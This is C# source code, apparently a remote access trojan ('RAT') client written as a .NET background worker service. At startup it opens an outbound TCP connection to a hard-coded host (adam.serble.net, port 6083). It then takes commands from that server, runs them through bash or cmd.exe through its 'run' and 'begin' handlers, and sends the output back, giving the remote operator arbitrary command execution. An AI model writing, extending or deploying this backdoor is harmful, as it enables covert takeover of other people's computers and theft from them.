using System.Net.Sockets;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace RAT;

public class Worker : BackgroundService {
    private readonly ILogger<Worker> _logger;

    public Worker(ILogger<Worker> logger) {
        _logger = logger;
    }
    
    private static string ReceiveMessage(Stream stream) {
        // Read until we get a newline
        StringBuilder cmdBuilder = new();
        while (true) {
            int b = stream.ReadByte();
            if (b == -1) {
                break;
            }
            if (b == '\n') {
                break;
            }
            cmdBuilder.Append((char)b);
        }
        // Replace all escaped newlines with real newlines
        return cmdBuilder.Replace("\\n", "\n").ToString();
    }
    
    private static void SendMessage(Stream socket, string data) {
        // Escape the newline character
        data = data.Replace("\n", "\\n");
        // Send the data
        socket.Write(Encoding.UTF8.GetBytes(data + "\n"));
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken) {
        _logger.LogInformation("RAT worker started");

        TcpClient client = new();
        await client.ConnectAsync("adam.serble.net", 6083, stoppingToken);

        while (!stoppingToken.IsCancellationRequested) {
            NetworkStream stream = client.GetStream();
            
            string message = ReceiveMessage(stream);
            
            // byte[] buffer = new byte[1024];
            // int bytesRead = await stream.ReadAsync(buffer, stoppingToken);
            // _logger.LogInformation("RAT worker received {bytesRead} bytes", bytesRead);
            // string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
            // if (message == "") continue;
            _logger.LogInformation(message);
            
            // Process command
            string[] args = message.Split(' ');
            string outData = "";
            switch (args[0]) {
                    
                default:
                    // Send error message
                    outData = "ERROR: Unknown command";
                    break;
                    
                case "ping":
                    // Send pong message
                    outData = "pong";
                    break;
                    
                case "init":
                    // Send initialization message
                    outData = "init";
                    break;
                    
                case "run":
                    // Run command
                    string command = message[(message.IndexOf(' ') + 1)..];
                    string cmdExecutor = RuntimeInformation.IsOSPlatform(OSPlatform.Linux) ? "bash" : "cmd.exe";
                    try {
                        Process process = Process.Start(new ProcessStartInfo { FileName = cmdExecutor, Arguments = $"-c \"{command}\"", UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true })!;

                        _logger.LogInformation("Running command: " + process.HasExited);
                        // Get process output
                        await process.WaitForExitAsync(stoppingToken);
                        string output = await process.StandardOutput.ReadToEndAsync();
                        string error = await process.StandardError.ReadToEndAsync();
                        output = output == "" ? error == "" ? "No output" : error : output;
                        // Send output message
                        outData = output;
                        _logger.LogInformation("Command output: " + output);
                    }
                    catch (Exception e) {
                        _logger.LogError(e, "Error running command");
                        // Send error message
                        await stream.WriteAsync(Encoding.UTF8.GetBytes("Error: " + e.Message), stoppingToken);
                    }
                    break;
                
                case "begin":
                    // Run command
                    string commandBegin = message[(message.IndexOf(' ') + 1)..];
                    string cmdExecutorBegin = RuntimeInformation.IsOSPlatform(OSPlatform.Linux) ? "bash" : "cmd.exe";
                    try {
                        Process process = Process.Start(new ProcessStartInfo { FileName = cmdExecutorBegin, Arguments = $"-c \"{commandBegin}\"", UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true })!;

                        _logger.LogInformation("Running command: " + process.HasExited);
                        outData = "Started execution";
                    }
                    catch (Exception e) {
                        _logger.LogError(e, "Error running command");
                        // Send error message
                        await stream.WriteAsync(Encoding.UTF8.GetBytes("Error: " + e.Message), stoppingToken);
                    }
                    break;
                    
                case "continue":
                    // Respond with "Ok"
                    outData = "Ok";
                    break;
                
                case "exit":
                    throw new OperationCanceledException();
                
                case "kill":
                    // Kill this computer
                    outData = "WIP";
                    break;
            }
                
            // Send output message length
            // byte[] lengthBuffer = new byte[10];
            // // fill data length
            // byte[] lengthBytes = Encoding.UTF8.GetBytes(outData.Length.ToString());
            // for (int i = 0; i < lengthBytes.Length; i++) {
            //     lengthBuffer[i] = lengthBytes[i];
            // }
            // await stream.WriteAsync(lengthBuffer, stoppingToken);
            // Get acknowledgement
            // bytesRead = await stream.ReadAsync(buffer, stoppingToken);
            // write
            SendMessage(stream, outData);
            //await stream.WriteAsync(Encoding.UTF8.GetBytes(outData + "\n"), stoppingToken);
        }
        
    }
}